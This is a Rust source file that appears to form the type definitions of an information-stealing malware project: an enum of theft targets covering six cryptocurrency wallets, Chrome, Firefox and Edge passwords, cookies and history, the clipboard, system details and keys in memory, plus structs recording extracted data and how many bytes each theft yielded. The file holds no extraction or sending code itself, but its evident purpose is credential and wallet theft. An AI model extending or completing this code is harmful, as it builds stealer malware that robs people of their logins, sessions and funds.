use std::collections::BTreeMap;

/// Types of data that can be extracted
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ExtractionTarget {
    // Wallets
    MetaMask,
    Exodus,
    Electrum,
    BitcoinCore,
    TrustWallet,
    AtomicWallet,

    // Browsers
    ChromePasswords,
    ChromeCookies,
    ChromeHistory,
    FirefoxPasswords,
    FirefoxCookies,
    EdgePasswords,

    // System
    SystemInfo,
    NetworkInfo,
    HardwareInfo,
    Clipboard,

    // Memory
    MemoryKeys,
}

impl ExtractionTarget {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::MetaMask => "metamask",
            Self::Exodus => "exodus",
            Self::Electrum => "electrum",
            Self::BitcoinCore => "bitcoin_core",
            Self::TrustWallet => "trust_wallet",
            Self::AtomicWallet => "atomic_wallet",

            Self::ChromePasswords => "chrome_passwords",
            Self::ChromeCookies => "chrome_cookies",
            Self::ChromeHistory => "chrome_history",
            Self::FirefoxPasswords => "firefox_passwords",
            Self::FirefoxCookies => "firefox_cookies",
            Self::EdgePasswords => "edge_passwords",

            Self::SystemInfo => "system_info",
            Self::NetworkInfo => "network_info",
            Self::HardwareInfo => "hardware_info",
            Self::Clipboard => "clipboard",

            Self::MemoryKeys => "memory_keys",
        }
    }

    pub fn category(&self) -> &'static str {
        match self {
            Self::MetaMask | Self::Exodus | Self::Electrum |
            Self::BitcoinCore | Self::TrustWallet | Self::AtomicWallet => "wallet",

            Self::ChromePasswords | Self::ChromeCookies | Self::ChromeHistory |
            Self::FirefoxPasswords | Self::FirefoxCookies | Self::EdgePasswords => "browser",

            Self::SystemInfo | Self::NetworkInfo | Self::HardwareInfo | Self::Clipboard => "system",

            Self::MemoryKeys => "memory",
        }
    }
}

/// Extracted data blob
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExtractedData {
    pub target: ExtractionTarget,
    pub name: String,
    pub data_type: DataType,
    pub content: Vec<u8>,
    pub metadata: BTreeMap<String, String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DataType {
    Binary,
    Text,
    Json,
    Database,
}

impl DataType {
    pub fn mime_type(&self) -> &'static str {
        match self {
            Self::Binary => "application/octet-stream",
            Self::Text => "text/plain",
            Self::Json => "application/json",
            Self::Database => "application/x-sqlite3",
        }
    }
}

/// Result of an extraction operation
#[derive(Debug, Clone)]
pub struct ExtractionResult {
    pub target: ExtractionTarget,
    pub success: bool,
    pub data: Vec<ExtractedData>,
    pub error: Option<String>,
    pub items_extracted: usize,
    pub bytes_extracted: usize,
}

impl ExtractionResult {
    pub fn success(target: ExtractionTarget, data: Vec<ExtractedData>) -> Self {
        let bytes = data.iter().map(|d| d.content.len()).sum();
        let items = data.len();
        
        Self {
            target,
            success: true,
            data,
            error: None,
            items_extracted: items,
            bytes_extracted: bytes,
        }
    }
    
    pub fn failure(target: ExtractionTarget, error: String) -> Self {
        Self {
            target,
            success: false,
            data: Vec::new(),
            error: Some(error),
            items_extracted: 0,
            bytes_extracted: 0,
        }
    }
}
